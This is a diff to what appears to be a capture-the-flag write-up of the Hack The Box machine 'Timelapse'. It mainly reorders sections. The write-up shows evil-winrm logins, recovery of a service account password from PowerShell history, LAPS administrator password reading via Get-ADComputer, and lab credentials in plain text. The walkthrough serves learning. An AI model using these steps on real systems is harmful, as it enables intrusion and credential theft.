@@ -172,7 +172,7 @@ cat tmp | awk '{print $1}' | sort | uniq -c | sort -nr
 
 
 ## Foothold
-- Evil-winrm using the certificate and private key. 
+> - Evil-winrm using the certificate and private key. 
 
 ### Extracting Keys
 
@@ -207,12 +207,7 @@ evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
 >- The command line history shows new login credentials. 
 - Evil-winrm using the obtained credentials `svc_deploy`.
 
-## Privilege Escalation
->- `svc_deploy` is a member of `LAPS_Readers` group.
-- Running `Get-ADComputer DC01 -property 'ms-mcs-admpwd'` shows the password for the administrator.
-- Evil-winrm as admin. 
- 
- ### Enumeration
+### Reading PowerShell history
 
 ```powershell
 # Read history
@@ -225,12 +220,6 @@ type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.tx
 svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV
 ```
 
-#### WinPEAS
-
-Program 'peas.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted software.
-
-![screenshot](/assets/images/timelapse17.png)
-
 ### Evil-winrm as `svc_deploy`
 
 ```sh
@@ -238,6 +227,21 @@ evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
 ```
 
 ![screenshot](/assets/images/timelapse20.png)
+
+## Privilege Escalation
+>- `svc_deploy` is a member of `LAPS_Readers` group.
+- Running `Get-ADComputer DC01 -property 'ms-mcs-admpwd'` shows the password for the administrator.
+- Evil-winrm as admin. 
+ 
+### WinPEAS
+
+Program 'peas.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted software.
+
+AV is enabled on the target machine. 
+
+![screenshot](/assets/images/timelapse17.png)
+
+### Manual Enumeration
 
 ![screenshot](/assets/images/timelapse21.png)
 
@@ -253,7 +257,7 @@ Get-ADComputer DC01 -property 'ms-mcs-admpwd'
 
 ![screenshot](/assets/images/timelapse22.png)
 
-## Evil-winrm as admin
+### Evil-winrm as admin
 
 ```sh
 evil-winrm -i timelapse.htb -S -u administrator -p '55T{8XL047sxk(5Iv}fK3o02'
